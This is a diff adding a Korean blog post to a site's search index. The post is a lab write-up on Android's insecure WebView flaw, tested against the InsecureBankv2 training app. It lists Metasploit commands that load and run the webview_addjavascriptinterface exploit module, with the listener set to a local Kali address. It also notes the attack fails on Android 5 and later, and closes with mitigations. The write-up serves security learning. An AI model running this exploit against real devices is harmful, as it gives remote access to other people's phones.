@@ -5960,4 +5960,162 @@ section 진행 기간
         <tag>모바일</tag>
       </tags>
   </entry>
+  <entry>
+    <title>[안드로이드 취약점] 안전하지 않은 웹 뷰 실행</title>
+    <url>/2022/01/08/2022-01-08-%5B%EC%95%88%EB%93%9C%EB%A1%9C%EC%9D%B4%EB%93%9C%20%EC%B7%A8%EC%95%BD%EC%A0%90%5D%20%EC%95%88%EC%A0%84%ED%95%98%EC%A7%80%20%EC%95%8A%EC%9D%80%20%EC%9B%B9%20%EB%B7%B0%20%EC%8B%A4%ED%96%89/</url>
+    <content><![CDATA[<h1 id="🤔-안전하지-않은-웹-뷰-실행"><a href="#🤔-안전하지-않은-웹-뷰-실행" class="headerlink" title="🤔  안전하지 않은 웹 뷰 실행?"></a>🤔  안전하지 않은 웹 뷰 실행?</h1><br>
+
+<p>웹 뷰란 안드로이드에서 웹 브라우저에서 보이는 화면을 표시할 때 사용합니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🔎-취약점-진단"><a href="#🔎-취약점-진단" class="headerlink" title="🔎 취약점 진단"></a>🔎 취약점 진단</h1><br>
+
+<blockquote>
+<p>본 취약점 점검 앱은 <code>Insecurebankv2</code>로 진행합니다.</p>
+</blockquote>
+<br>
+
+<br>
+
+<h2 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h2><br>
+
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">/* AndroidManifest.xml 일부 */</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure>
+
+<br>
+
+<p><code>AndroidManifest.xml</code> 파일에 인터넷 사용 권한이 존재합니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="💡-점검-방법"><a href="#💡-점검-방법" class="headerlink" title="💡 점검 방법"></a>💡 점검 방법</h1><br>
+
+<blockquote>
+<p>칼리 버전 : Linux kali 5.15.0-kali2-amd64 #1 SMP Debian 5.15.5-2kali2 (2021-12-22) x86_64 GNU/Linux</p>
+</blockquote>
+<br>
+
+<p>칼리에 있는 메타익스플로잇을 이용해 점검을 하겠습니다.</p>
+<br>
+
+<br>
+
+<h2 id="메타익스플로잇-실행"><a href="#메타익스플로잇-실행" class="headerlink" title="메타익스플로잇 실행"></a>메타익스플로잇 실행</h2><br>
+
+<blockquote>
+<p># msfconsole</p>
+</blockquote>
+<br>
+
+<img src="/images/Android/안전하지 않은 웹 뷰 실행/msf.png">
+
+<br>
+
+<p>메타익스플로잇을 실행시켜줍니다.</p>
+<br>
+
+<br>
+
+<h2 id="웹-뷰-취약점-모듈-실행"><a href="#웹-뷰-취약점-모듈-실행" class="headerlink" title="웹 뷰 취약점 모듈 실행"></a>웹 뷰 취약점 모듈 실행</h2><br>
+
+<blockquote>
+<p>msf6 &gt; use exploit/android/browser/webview_addjavascriptinterface</p>
+</blockquote>
+<br>
+
+<p>메타익스플로잇의 웹 뷰 취약점 모듈을 실행시켜줍니다.</p>
+<br>
+
+<img src="/images/Android/안전하지 않은 웹 뷰 실행/module.png">
+
+<br>
+
+<br>
+
+<h2 id="웹-뷰-취약점-모듈-설정"><a href="#웹-뷰-취약점-모듈-설정" class="headerlink" title="웹 뷰 취약점 모듈 설정"></a>웹 뷰 취약점 모듈 설정</h2><br>
+
+<blockquote>
+<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; set LHOST 192.168.219.105</p>
+</blockquote>
+<blockquote>
+<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; show options</p>
+</blockquote>
+<br>
+
+<p><code>set LHOST IP</code> 명령어로 칼리 리눅스의 IP를 넣어줍니다.</p>
+<p><code>show options</code> 명령어로 옵션들과 <code>set LHOST IP</code>로 넣어준 IP가 맞는지 확인해줍니다.</p>
+<br>
+
+<img src="/images/Android/안전하지 않은 웹 뷰 실행/set_ip.png">
+
+<br>
+
+<br>
+
+<h2 id="URL-설정-amp-Exploit"><a href="#URL-설정-amp-Exploit" class="headerlink" title="URL 설정 &amp; Exploit"></a>URL 설정 &amp; Exploit</h2><br>
+
+<blockquote>
+<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; set URIPATH xitcsk</p>
+</blockquote>
+<blockquote>
+<p>msf6 exploit(android/browser/webview_addjavascriptinterface) &gt; exploit</p>
+</blockquote>
+<br>
+
+<p><code>set URIPATH xitcsk</code> 명령어로 공격에 사용할 <code>URL</code>을 설정했습니다.</p>
+<p><code>exploit</code> 명령어로 공격을 실행해줍니다.</p>
+<br>
+
+<img src="/images/Android/안전하지 않은 웹 뷰 실행/exploit.png">
+
+<br>
+
+<br>
+
+<h2 id="가상-디바이스에서-URL-접속"><a href="#가상-디바이스에서-URL-접속" class="headerlink" title="가상 디바이스에서 URL 접속"></a>가상 디바이스에서 URL 접속</h2><br>
+
+<p>가상 디바이스인 <code>NOX</code>에서 칼리 리눅스에서 생성했던 <code>URL</code>로 접속합니다.</p>
+<p><code>URL</code>에 접속해주면 칼리 리눅스에서 안드로이드 디바이스에 접근할 수 있습니다.</p>
+<br>
+
+<img src="/images/Android/안전하지 않은 웹 뷰 실행/connect_url.png">
+
+<br>
+
+<p>* 찾아보니 안드로이드 4.2 이하에서만 작동된다고 합니다. NOX 에서는 안드로이드 5 이상만 지원하기 때문에 실습이 불가능합니다.</p>
+<br>
+
+<br>
+
+<hr>
+<br>
+
+<h1 id="🔒-대응-방안"><a href="#🔒-대응-방안" class="headerlink" title="🔒 대응 방안"></a>🔒 대응 방안</h1><br>
+
+<p>해당 취약점의 경우 안드로이드 4.3 버전 이하 환경에서는 보안 패치를 중단했기 때문에 안드로이드 4.4 버전 이상을 사용해야 합니다.</p>
+<br>
+
+<p>웹 뷰를 구현할 때 웹 뷰 대신에 <code>HTML5 런타임 프레임워크 Crosswalk</code>를 사용해 주는 것도 방법입니다.</p>
+<br>
+
+<br>
+
+<hr>
+]]></content>
+      <categories>
+        <category>Android</category>
+      </categories>
+      <tags>
+        <tag>Android</tag>
+        <tag>모바일</tag>
+      </tags>
+  </entry>
 </search>
